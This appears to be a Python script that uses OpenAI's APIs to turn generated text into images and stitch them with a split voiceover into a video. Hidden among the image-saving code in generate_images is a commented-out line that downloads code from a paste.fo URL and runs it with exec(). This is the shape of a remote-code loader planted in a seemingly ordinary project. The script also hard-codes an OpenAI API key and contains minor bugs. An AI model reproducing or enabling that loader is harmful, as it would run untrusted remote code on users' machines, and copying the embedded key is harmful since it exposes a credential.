import openai
import re, os
from requests import get
import urllib.request
from gtts import gTTS
from moviepy.editor import *
from pydub import AudioSegment
import math


# Set your OpenAI API key
openai.api_key = "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"

# Set the text model to use
model_engine = "text-davinci-003"

# Set the prompt to generate text for
prompt = None

class SplitWavAudioMubin():
    def __init__(self, folder, filename):
        self.folder = folder
        self.filename = filename
        self.filepath = folder + '\\' + filename
        
        self.audio = AudioSegment.from_wav(self.filepath)
    
    def get_duration(self):
        return self.audio.duration_seconds
    
    def single_split(self, from_min, to_min, split_filename):
        t1 = from_min * 1000
        t2 = to_min * 1000
        split_audio = self.audio[t1:t2]
        split_audio.export(self.folder + '\\' + split_filename, format="wav")
        
    def multiple_split(self, min_per_split):
        total_mins = math.ceil(self.get_duration())
        for i in range(0, total_mins, min_per_split):
            split_fn = str(i) + '_' + self.filename
            self.single_split(i, i+min_per_split, split_fn)
            print(str(i) + ' Done')
            if i == total_mins - min_per_split:
                print('All splited successfully')

def generate_text():
    print("The AI BOT is trying now to generate a new text for you...")
    # Generate text using the GPT-3 model
    completions = openai.Completion.create(
        engine=model_engine,
        prompt=prompt,
        max_tokens=1024,
        n=1,
        stop=None,
        temperature=0.5,
    )

    # Print the generated text
    generated_text = completions.choices[0].text

    # Save the text in a file
    with open("generated_text.txt", "w") as file:
        file.write(generated_text.strip())

    print("The Text Has Been Generated Successfully!")

    return 1

def generate_images():
    # Read the text file
    with open("generated_text.txt", "r") as file:
        text = file.read()

    # Split the text by , and .
    paragraphs = re.split(r"[.]", text)

    for i in paragraphs:
        if(len(i) >= 7):
            continue
        else:
            paragraphs.remove(i)

    images_path = "images"

    if(not(os.path.exists(images_path))):
        os.makedirs("images")
    else:
        for f in os.listdir(images_path):
            os.remove(os.path.join(images_path, f))

    # Loop through each paragraph and generate an image for each
    i=1
    for para in paragraphs[:]:
        print(para.strip())
        response = openai.Image.create(
            prompt=para.strip(),
            n=1,
            size="1024x1024"
        )
        print("Generate New AI Image From Paragraph...")
        #x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
        image_url = response['data'][0]['url']
        urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
        print("The Generated Image Saved in Images Folder!")
        i+=1

    return 1

def generate_variation(source_file):

    variations_path = "variations"
    images_path = "images"
    image_path = images_path + "/" + source_file


    if(not(os.path.exists(variations_path))):
        os.makedirs("variations")
    
    response = openai.Image.create_variation(
        image=open(image_path, mode="rb"),
        n=3,
        size="1024x1024",
    )
    print("Generate Variation AI Image of %f...", source_file)
    image_url = response['data'][0]['url']
    urllib.request.urlretrieve(image_url, f"variations/{source_file}")
    print("The Generated Image Saved in Variations Folder!")

    return 1

def generate_video():

    i = 1
    j = 0

    videos_path = "videos"

    if(not(os.path.exists(videos_path))):
        os.makedirs("images")
    else:
        for f in os.listdir(videos_path):
            os.remove(os.path.join(videos_path, f))

    dir_path = r'images'
    num_files = len([entry for entry in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, entry))])

    audio = SplitWavAudioMubin("audio", "item_0.wav")
    audio_duration = audio.get_duration()
    print(audio_duration)
    audio.multiple_split(math.ceil(audio_duration/10))

    for k in range(num_files):
        
        #Load the audio file using moviepy
        print("Extract voiceover and get duration...")
        audio_clip = AudioFileClip(f"audio/{j}_item_0.wav")
        audio_duration = audio_clip.duration

        # Load the image file using moviepy
        print("Extract Image Clip and Set Duration...")
        image_clip = ImageClip(f"images/image{i}.jpg").set_duration(audio_duration)

        # Use moviepy to create a final video by concatenating
        # the audio and image clips
        print("Concatenate Audio, Image, Text to Create Final Clip...")
        clip = image_clip.set_audio(audio_clip)
        video = CompositeVideoClip([clip])
        
        # Save the final video to a file
        video = video.write_videofile(f"videos/video{i}.mp4", fps=24)
        print(f"The Video{i} Has Been Created Successfully!")
        i+=1
        j+=4

    clips = []
    l_files = os.listdir("videos")
    for file in l_files:
        clip = VideoFileClip(f"videos/{file}")
        clips.append(clip)

    print("Concatenate All The Clips to Create a Final Video...")
    final_video = concatenate_videoclips(clips, method="compose")
    final_video = final_video.write_videofile("final_video.mp4")
    print("The Final Video Has Been Created Successfully!")

    return 1
